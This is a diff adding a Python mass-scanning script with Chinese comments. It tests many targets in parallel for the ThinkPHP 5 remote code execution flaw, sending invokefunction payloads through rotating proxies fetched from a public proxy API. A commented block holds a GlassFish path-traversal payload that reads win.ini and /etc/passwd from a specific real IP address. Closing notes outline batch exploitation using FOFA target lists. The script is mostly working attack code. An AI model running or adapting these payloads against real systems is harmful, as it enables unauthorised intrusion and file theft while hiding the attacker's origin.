@@ -1,0 +1,110 @@
+import requests
+import base64
+requests.packages.urllib3.disable_warnings()
+import threading
+from concurrent.futures import ThreadPoolExecutor       #导入线程池
+import random
+import time
+requests.packages.urllib3.disable_warnings()
+
+# ---------- 代理池配置 ----------
+PROXY_API = "https://proxy.scdn.io/api/get_proxy.php"
+PROXY_COUNT = 10          # 一次性获取 10 个代理，用完再取新的
+proxy_list = []           # 缓存代理列表
+
+def fetch_proxies(count=PROXY_COUNT, protocol="http"): #获取10个参数 第二个参数，指定代理协议类型，默认值为 "http"。调用时如果不传，就只获取 HTTP 代理。
+    """从 API 获取代理列表"""
+    try:
+        params = {
+            "protocol": protocol,
+            "count": count
+        }
+        resp = requests.get(PROXY_API, params=params, timeout=10)   
+        if resp.status_code == 200:
+            data = resp.json()             #按照python字典返回
+            if data.get("code") == 200 and "data" in data:     #读取ip
+                proxies = data["data"].get("proxies", [])
+                print(f"[*] 获取到 {len(proxies)} 个代理")      #获取到的ip数量
+                return proxies
+    except Exception as e:
+        print(f"[!] 获取代理失败: {e}")
+    return []
+
+def get_proxy():
+    """获取一个代理，如果列表为空则重新拉取"""
+    global proxy_list                          #ip存储的列表
+    if not proxy_list:
+        proxy_list = fetch_proxies()           #回到第一个函数获取ip
+    return random.choice(proxy_list) if proxy_list else None       #如果不是空就返回ip
+threadings=[]
+def poc(url):
+    texts=[
+        "/index.php?s=index/\\think\\app/invokefunction&function=phpinfo&vars[0]=1",
+        "/index.php?s=index/\\think\\Request/input&filter=phpinfo&data=1"
+    ]
+    for text in texts:
+        pocurl=url+text
+        try:
+            proxy = get_proxy()                                                                        #读取一个可用代理ip
+            proxies = {"http": f"http://{proxy}", "https": f"https://{proxy}"} if proxy else None      #拼接代理ip
+            resp = requests.get(pocurl, proxies=proxies, verify=False, timeout=8) #避免ssl证书报错，Web poc用get
+            if  resp.status_code == 200 and "php" in resp.text:
+                print("thinkphp5漏洞存在----------",url)
+                return 
+            else:
+                print("False")
+                pass
+        except:
+           
+            pass
+                    
+
+if __name__ =="__main__":
+    pool = ThreadPoolExecutor(max_workers=30)
+    with open ("poc.txt","r",encoding="utf-8") as f:
+        for url in f:
+            url = url.strip()                     # 去掉换行空格
+            pool.submit(poc,url)                           #submit()固定用法：往线程池里丢任务poc你写的 漏洞检测函数（就是你代码里 def poc (url): 这一堆）url要传给 poc 函数的 网址参数 
+    pool.shutdown(wait=True)
+
+
+
+
+"""
+验证代码漏洞,glassfish示例
+
+url="http://110.238.64.195:4848"
+winsurl=url+"/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini"
+linuxurl=url+"/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+#data_win=requests.get(winsurl,verify=False)
+#data_linux=requests.get(linuxurl,verify=False)
+
+data_win=requests.get(winsurl,verify=False).status_code
+data_linux=requests.get(linuxurl,verify=False).status_code
+
+if data_win == 200 or data_linux==200:
+    print("glassfish漏洞存在")
+else:
+    print("没有查找到漏洞")
+
+
+#print(data_win.text)
+#print(data_linux.text)
+"""
+
+
+
+
+"""
+如何实现漏洞批量化:
+1.获取到存在漏洞的地址信息--fofa进行获取目标
+    1.2将请求消息进行筛选--利用python lxml获取或者正则表达式的获取
+2.批量请求地址信息进行判断是否存在--可用多线程
+3.
+
+"""
+
+
+
+
+
